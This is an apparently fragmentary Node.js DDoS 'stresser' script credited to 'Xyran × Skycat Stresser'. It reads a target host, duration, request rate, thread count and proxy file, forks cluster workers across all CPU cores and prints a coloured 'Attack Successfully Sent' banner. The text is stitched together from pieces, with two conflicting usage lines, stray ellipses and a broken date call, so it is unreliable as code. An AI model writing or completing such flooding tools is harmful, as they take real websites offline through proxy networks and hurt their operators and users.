...
const blockedDomain = [".baxioz", ".baxio"];
...
const month = date.getMonth(7) + 1; // Month is zero-based, so we add 1 to get the correct month
...
const secureOptions = 
 ...
 crypto.constants.SSL_OP_SINGLE_ECDH_USE |
 crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 if (process.argv.length < 7){console.log(`Usage: node H2-NEYLI [host] [time] [rps] [thread] [proxyfile]`); process.exit();}
...
const RESTART_DELAY = 1000;
 ...
 console.clear();
    ...
    console.log(`--------------------------------------------`.gray);
    console.log(`Merhods By Xyran × Skycat Stresser`.brightCyan);
...
return
 ...
 if (process.argv.length < 7){console.log('node chaptcha.js (url) (time) (req) (threads) (proxyfiles)'); process.exit();}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
...
if (cluster.isMaster) {
    ...
    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
        console.log(` 
 [ Target Details ]`.white);
    console.log(`    ${'TARGET'.red}   ${':'.red}   ${'['.red} ${`${target}`.white} ${']'.red}
    ${'PORT'.red}     ${':'.red}   ${'['.red} ${'443'.white} ${']'.red}
    ${'TIME'.red}     ${':'.red}   ${'['.red} ${`${time}`.white} ${']'.red}`)
    console.log(` [ Attack Details ]`.white)
    console.log(`    ${'Status'.red}   ${':'.red}   ${'['.red} ${'Attack Successfully Sent'.white} ${']'.red}
    ${'METHOD'.red}   ${':'.red}   ${'['.red} ${`HTTP-COSTUM`.white} ${']'.red}
    ${'CONS'.red}     ${':'.red}   ${'['.red} ${`1`.white} ${']'.red}
    ${'DATE'.red}     ${':'.red}   ${'['.red} ${`${year}-${month}-${day}`.white} ${']'.red}`)
console.log(`\n`);
